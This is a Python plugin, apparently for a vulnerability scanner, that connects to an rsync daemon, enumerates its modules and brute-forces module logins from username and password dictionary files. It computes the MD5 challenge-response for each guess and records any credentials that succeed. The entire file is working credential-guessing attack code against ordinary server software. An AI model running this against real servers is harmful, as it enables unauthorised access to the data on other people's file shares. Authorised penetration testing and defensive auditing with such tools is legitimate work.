#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import asyncio
import struct
import hashlib
import base64
from lib.utils.connect import open_connection
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.RSYNC
        self.name = 'rsync burst'
        self.keyword = ['rsync', 'burst']
        self.info = 'rsync burst'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        reader, writer = await open_connection(self.target_host, self.target_port)
        message = struct.pack("!8s5ss", bytes("@RSYNCD:", 'utf-8'), bytes(" 30.0", 'utf-8'), bytes("\r\n", 'utf-8'))
        writer.write(message)
        data = await reader.read(1024)
        try:
            reply = struct.unpack('!8s5ss', data)
        except:
            writer.close()
            return
        if len(reply) == 3:
            rsynclist = await self.ClientQuery(reader, writer)  # 查询模块名
            writer.close()
            if float(reply[1]) >= 30.0:
                for i in range(len(rsynclist) - 1):
                    result = await self.ClientCommand(rsynclist[i])
                    if result:
                        self.flag = 1
                        self.res.append({"info": result[0] + ':' + result[1] + ':' + result[2] , "key": "rsync weakpass", "rsync_info": data})
        else:
            writer.close()

    async def ClientQuery(self, reader, writer):
        '''
            查询所有的模块名
            @return module name
        '''
        modulelist = []
        message = struct.pack("!s", bytes("\n", 'utf-8'))

        writer.write(message)
        message = '\r\n'
        writer.write(message.encode('utf-8'))
        await asyncio.sleep(0.5)
        data = await reader.read(1024)
        moduletemp = struct.unpack("!" + str(len(data.decode('utf-8'))) + "s", data)

        modulenames = moduletemp[0].decode('utf-8').split("\n")
        for modulename in modulenames:
            if not modulename or modulename.startswith("@RSYNCD"):
                continue
            elif '@RSYNCD' not in modulename and ' ' in modulename:
                modulename = modulename[:modulename.index(" ")]
                modulelist.append(modulename)


        return modulelist

    async def ClientCommand(self, cmd):

        payload1 = struct.pack("!8s5ss", bytes("@RSYNCD:", 'utf-8'),bytes(" 30.0", 'utf-8'), bytes("\r\n", 'utf-8'))
        payload2 = (cmd + '\r\n').encode('utf-8')
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
            'dict/rsync_usernames.txt')
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
            'dict/rsync_passwords.txt')
        async for (username, password) in self.generate_dict(usernamedic, passworddic):
            try:
                reader1, writer1 = await open_connection(self.target_host, self.target_port)
                writer1.write(payload1)

                message = '\r\n'
                writer1.write(message.encode('utf-8'))

                data1 = await reader1.read(1024)
                data1 = data1.decode('utf-8')
                writer1.write(payload2)

                message = '\r\n'
                writer1.write(message.encode('utf-8'))

                data2 = await reader1.read(1024)
                data2 = data2.decode('utf-8').replace("\n", "")  # data  @RSYNCD: AUTHREQD 9moobOy1VMjNAU/D4PB35g

                if data2 and 'AUTHREQD ' in data2:
                    challenge = data2[18:-1]  # get challenge code
                    md = hashlib.md5()
                    md.update(password.encode('utf-8'))
                    md.update(challenge.encode('utf-8'))
                    auth_send_data = base64.encodebytes(md.digest())
                    payload3 = "%s %s\r\n" % (username, auth_send_data[:-3])

                    writer1.write(payload3.encode('utf-8'))
                    data3 = (await reader1.read(1024)).decode('utf-8')  # @RSYNCD: OK

                    writer1.close()
                    if 'OK' in data3:
                        return cmd, username, password
                else:
                    writer1.close()
            except:
                writer1.close()
                pass
